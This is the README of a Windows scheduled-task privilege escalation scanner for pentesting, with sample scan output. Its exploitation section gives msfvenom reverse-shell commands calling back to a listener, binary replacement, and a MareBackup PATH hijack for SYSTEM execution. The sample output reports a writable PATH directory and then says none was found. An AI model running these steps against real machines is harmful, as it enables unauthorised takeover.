# TaskPrivEscScanner

<p align="center">
  <img src="https://img.shields.io/badge/platform-Windows-blue?style=flat-square" alt="Platform">
  <img src="https://img.shields.io/badge/.NET-4.8-purple?style=flat-square" alt=".NET Version">
  <img src="https://img.shields.io/badge/license-MIT-green?style=flat-square" alt="License">
</p>

A Windows Scheduled Task privilege escalation scanner for penetration testing and red team operations. Identifies misconfigured scheduled tasks that can be exploited for local privilege escalation.

## Features

- **Scheduled Task Analysis**: Enumerates all scheduled tasks and identifies those running with elevated privileges (SYSTEM, Administrator, HighestAvailable)
- **Permission Checking**: Detects tasks that can be triggered by low-privileged users (Everyone, Authenticated Users, Users, Interactive)
- **Binary Analysis**: Checks if executed binaries are writable or missing with writable parent directories
- **COM Handler Support**: Analyzes COM handler actions, resolves CLSIDs to DLL paths, and checks permissions
- **Writable PATH Detection**: Identifies writable directories in SYSTEM PATH for DLL hijacking
- **MareBackup Detection**: Specific detection for the MareBackup privilege escalation technique
- **Exploitation Guidance**: Provides step-by-step exploitation instructions for each finding

## Screenshot

```
╔══════════════════════════════════════════════════════════════════════════════╗
║  ████████╗ █████╗ ███████╗██╗  ██╗██████╗ ██████╗ ██╗██╗   ██╗███████╗███████╗║
║  ╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗██║██║   ██║██╔════╝██╔════╝║
║     ██║   ███████║███████╗█████╔╝ ██████╔╝██████╔╝██║██║   ██║█████╗  ███████╗║
║     ██║   ██╔══██║╚════██║██╔═██╗ ██╔═══╝ ██╔══██╗██║╚██╗ ██╔╝██╔══╝  ╚════██║║
║     ██║   ██║  ██║███████║██║  ██╗██║     ██║  ██║██║ ╚████╔╝ ███████╗███████║║
║     ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝  ╚══════╝╚══════╝║
║            Scheduled Task Privilege Escalation Scanner  v1.1                 ║
╚══════════════════════════════════════════════════════════════════════════════╝
```

## Installation

### Pre-built Binary

Download the latest release from the [Releases](../../releases) page.

### Build from Source

**Requirements:**
- Windows 10/11 or Windows Server 2016+
- Visual Studio 2019+ or .NET Framework 4.8 SDK

```batch
:: Clone repository
git clone https://github.com/yourusername/TaskPrivEscScanner.git
cd TaskPrivEscScanner

:: Build with dotnet CLI
dotnet build -c Release

:: Or use the build script
build.bat

:: Output
bin\Release\net4.8\TaskPrivEscScanner.exe
```

## Usage

```batch
:: Basic scan
TaskPrivEscScanner.exe

:: Export results to CSV
TaskPrivEscScanner.exe --export
TaskPrivEscScanner.exe -e
```

## Severity Levels

| Severity | Description | Impact |
|----------|-------------|--------|
| **CRITICAL** | Writable binary/DLL, missing binary with writable parent, or MareBackup + writable PATH | Direct privilege escalation |
| **HIGH** | SYSTEM task triggerable by low-priv users | Requires secondary vulnerability (DLL hijacking) |
| **MEDIUM** | Elevated task triggerable by low-priv users | Potential elevation depending on context |
| **LOW** | Permissive ACLs with limited impact | May be useful for persistence |

## Detection Capabilities

### 1. Writable Binaries

Detects scheduled tasks where the executed binary is writable by low-privileged users.

```
[Exec] Path: C:\VulnerableApp\updater.exe [WRITABLE]
       Writable By: BUILTIN\Users
```

### 2. Missing Binaries

Identifies tasks pointing to non-existent binaries with writable parent directories.

```
[Exec] Path: C:\MissingApp\service.exe [MISSING - PARENT WRITABLE]
       Writable By: Everyone
```

### 3. COM Handler Analysis

Resolves COM handler CLSIDs to actual DLL paths and checks permissions.

```
[COM Handler] CLSID: {12345678-1234-1234-1234-123456789012}
              ProgID: SomeApp.Handler
              Server: C:\Windows\System32\handler.dll
              Type:   InprocServer32 (DLL)
```

### 4. Writable PATH Directories

Checks for directories in SYSTEM PATH that are writable by low-privileged users.

```
════════════════════════════════════════════════════════════════════════════════
  CRITICAL: WRITABLE SYSTEM PATH DIRECTORIES
════════════════════════════════════════════════════════════════════════════════
  [!] C:\Python39\Scripts
      Writable By: BUILTIN\Users
```

### 5. MareBackup Privilege Escalation

Specific detection for the MareBackup scheduled task technique.

**References:**
- [Hijacking the Windows MareBackup Scheduled Task for Privilege Escalation](https://itm4n.github.io/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/)
- [SCRT Blog - Exploits](https://blog.scrt.ch/category/exploit/)

## Exploitation Examples

### Writable Binary

```batch
:: Backup original
copy "C:\VulnerableApp\updater.exe" "C:\VulnerableApp\updater.exe.bak"

:: Replace with payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe
copy payload.exe "C:\VulnerableApp\updater.exe"

:: Trigger task
schtasks /run /tn "\VulnerableApp\UpdateTask"

:: Cleanup
copy "C:\VulnerableApp\updater.exe.bak" "C:\VulnerableApp\updater.exe"
```

### MareBackup + Writable PATH
```batch
:: Create malicious powershell.exe (the actual hijack target)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o powershell.exe

:: Place in writable PATH directory (must be BEFORE C:\Windows\System32\WindowsPowerShell\v1.0\)
copy powershell.exe "C:\Python39\Scripts\powershell.exe"

:: Verify PATH order
reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path

:: Trigger MareBackup task
schtasks /run /tn "\Microsoft\Windows\Application Experience\MareBackup"

:: powershell.exe executes as SYSTEM

:: Cleanup
del "C:\Python39\Scripts\powershell.exe"
```

### DLL Hijacking Analysis

```batch
:: Check binary imports
dumpbin /imports "C:\Program Files\SomeApp\app.exe"

:: Monitor with Process Monitor
procmon /backingfile hijack.pml
:: Filter: Process Name contains "app.exe", Result is "NAME NOT FOUND"

:: Place malicious DLL
copy malicious.dll "C:\Program Files\SomeApp\missing.dll"
```

## CSV Export

Export findings for documentation or further analysis:

```batch
TaskPrivEscScanner.exe --export
```

**Columns:** Severity, TaskPath, TaskName, RunAs, PrivilegeLevel, State, StartableBy, ActionType, ActionPath, ActionArgs, ComClassId, ComServerPath, BinaryExists, BinaryWritable, WritableBy, Issues, StartCommand

### Example
```

╔═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                       ║

▄▄▄▄▄▄▄▄▄                 ▄▄▄▄▄▄▄                   ▄▄▄▄▄▄▄              ▄▄▄▄▄▄▄
▀▀▀███▀▀▀          ▄▄     ███▀▀███▄       ▀▀       ███▀▀▀▀▀             █████▀▀▀
   ███  ▀▀█▄ ▄█▀▀▀ ██ ▄█▀ ███▄▄███▀ ████▄ ██ ██ ██ ███▄▄    ▄█▀▀▀ ▄████  ▀████▄  ▄████  ▀▀█▄ ████▄ ████▄ ▄█▀█▄ ████▄
   ███ ▄█▀██ ▀███▄ ████   ███▀▀▀▀   ██ ▀▀ ██ ██▄██ ███      ▀███▄ ██       ▀████ ██    ▄█▀██ ██ ██ ██ ██ ██▄█▀ ██ ▀▀
   ███ ▀█▄██ ▄▄▄█▀ ██ ▀█▄ ███       ██    ██▄ ▀█▀  ▀███████ ▄▄▄█▀ ▀████ ███████▀ ▀████ ▀█▄██ ██ ██ ██ ██ ▀█▄▄▄ ██


║                                                                                                                       ║
║            Scheduled Task Privilege Escalation Scanner  v1.1                                                          ║
║                        https://github.com/S1lkys/TaskPrivEscScanner                                                   ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

[*] Current User: SILKY-PC\mbzra
[*] Is Admin: False
[*] Scan started at: 2026-01-18 23:42:42

[*] Scanned 162 scheduled tasks
[*] Found 1 potentially vulnerable tasks

════════════════════════════════════════════════════════════════════════════════
  SEVERITY LEGEND
════════════════════════════════════════════════════════════════════════════════

  [CRITICAL] Immediate privilege escalation possible

    What it means:
    The scheduled task runs with elevated privileges (SYSTEM/Admin) and either:
      - The executed binary is missing and the parent directory is writable, OR
      - The executed binary itself is writable by low-privileged users

    This allows an attacker to replace/create the binary with a malicious payload
    that will be executed with high privileges when the task runs.

    How to exploit:
    1. Identify the missing/writable binary path
    2. Create/replace the binary with your payload (e.g., reverse shell, add user)
    3. Trigger the task manually or wait for scheduled execution
    4. Payload executes with SYSTEM/Admin privileges

--------------------------------------------------------------------------------
  [HIGH] SYSTEM-level task can be triggered by low-priv users

    What it means:
    The scheduled task runs as NT AUTHORITY\SYSTEM and can be manually started
    by unprivileged users (Everyone, Authenticated Users, Users, Interactive).

    While the binary itself may not be directly exploitable, this could be
    combined with other vulnerabilities (DLL hijacking, argument injection,
    race conditions) for privilege escalation.

    How to exploit:
    1. Analyze the executed binary for DLL hijacking opportunities
    2. Check if arguments are controllable or injectable
    3. Look for race conditions in file operations
    4. Trigger task with: schtasks /run /tn "<TaskPath>"
    5. Exploit secondary vulnerability during execution

--------------------------------------------------------------------------------
  [MEDIUM] Elevated task can be triggered by low-priv users

    What it means:
    The scheduled task runs with elevated privileges (HighestAvailable) and can
    be manually started by unprivileged users.

    Depending on the RunAs user context, this may allow elevation from standard
    user to administrator level. Requires further analysis of the executed
    commands and potential attack vectors.

    How to exploit:
    1. Identify the actual privilege level when triggered
    2. Analyze executed commands for injection points
    3. Check for DLL search order hijacking
    4. Look for writable paths in the execution chain
    5. Trigger and observe behavior with Process Monitor

--------------------------------------------------------------------------------
  [LOW] Task with permissive ACLs, limited impact

    What it means:
    The scheduled task has overly permissive access controls but the security
    impact is limited due to the execution context or task configuration.

    May still be useful for persistence or lateral movement scenarios.

    How to exploit:
    1. Review task configuration for persistence opportunities
    2. Check if task can be modified to run custom commands
    3. Consider for maintaining access in post-exploitation

--------------------------------------------------------------------------------
[*] Checking for writable PATH directories...
[!] Found 1 writable PATH directories!


════════════════════════════════════════════════════════════════════════════════
  CRITICAL: WRITABLE SYSTEM PATH DIRECTORIES
════════════════════════════════════════════════════════════════════════════════

  These directories are in the SYSTEM PATH and writable by low-privileged users.
  This enables DLL hijacking for ANY process that searches PATH for DLLs.
  Combined with MareBackup task, this is a direct privilege escalation vector.

  Reference: https://itm4n.github.io/windows-dll-hijacking-clarified/

    [!] C:\privesc_hijacking
        Writable By: NT-AUTORITÄT\Authentifizierte Benutzer


════════════════════════════════════════════════════════════════════════════════
  HIGH FINDINGS (1)
════════════════════════════════════════════════════════════════════════════════


  ────────────────────────────────────────────────────────────────────────────
  \Microsoft\Windows\Application Experience\MareBackup
  ────────────────────────────────────────────────────────────────────────────
    Task Name           : MareBackup
    Task Folder         : /Microsoft/Windows/Application Experience
    State               : Ready

    Run As              : SYSTEM
    Privilege Level     : SYSTEM

    Startable By:
      - BUILTIN\Users

    Actions:
      [Exec] Path: %windir%\system32\compattelrunner.exe
             Args: -m:aeinv.dll -f:UpdateSoftwareInventoryW invsvc
      [Exec] Path: %windir%\system32\compattelrunner.exe
             Args: -m:appraiser.dll -f:DoScheduledTelemetryRun
      [Exec] Path: %windir%\system32\compattelrunner.exe
             Args: -m:aemarebackup.dll -f:BackupMareData

    Issues:
      ! MAREBACKUP: CompatTelRunner.exe spawns powershell.exe without absolute path
      ! No writable SYSTEM PATH found - requires finding/creating writable PATH entry
      ! May be exploitable for UAC bypass if PATH can be modified
      ! Reference: https://itm4n.github.io/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/

    Commands:
    ┌────────────────────────────────────────────────────────────────────────────────────────────┐
    │ Start Task:                                                                                │
    │   schtasks /run /tn "\Microsoft\Windows\Application Experience\MareBackup"                 │
    │                                                                                            │
    │ Query Details:                                                                             │
    │   schtasks /query /tn "\Microsoft\Windows\Application Experience\MareBackup" /v /fo list   │
    └────────────────────────────────────────────────────────────────────────────────────────────┘

    Exploitation Steps:
      === MAREBACKUP TASK (NO WRITABLE SYSTEM PATH) ===

      CompatTelRunner.exe spawns powershell.exe without absolute path.
      Exploitation requires a writable directory PREPENDED to SYSTEM PATH.

      Current status: No writable SYSTEM PATH directory found.

      Potential exploitation paths:
      1. Check if you can modify SYSTEM PATH (requires admin, but useful for UAC bypass)
      2. Look for software that adds writable directories to PATH during installation
      3. Check for other scheduled tasks with similar behavior

      To check PATH order:
         reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" /v Path

      References:
         - https://itm4n.github.io/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/
         - https://blog.scrt.ch/2025/05/20/hijacking-the-windows-marebackup-scheduled-task-for-privilege-escalation/


════════════════════════════════════════════════════════════════════════════════
  SUMMARY
════════════════════════════════════════════════════════════════════════════════


    CRITICAL :   0
    HIGH     :   1
    MEDIUM   :   0
    LOW      :   0
    ---------------
    TOTAL    :   1



[!] WRITABLE SYSTEM PATH DETECTED - High risk for DLL hijacking attacks!

```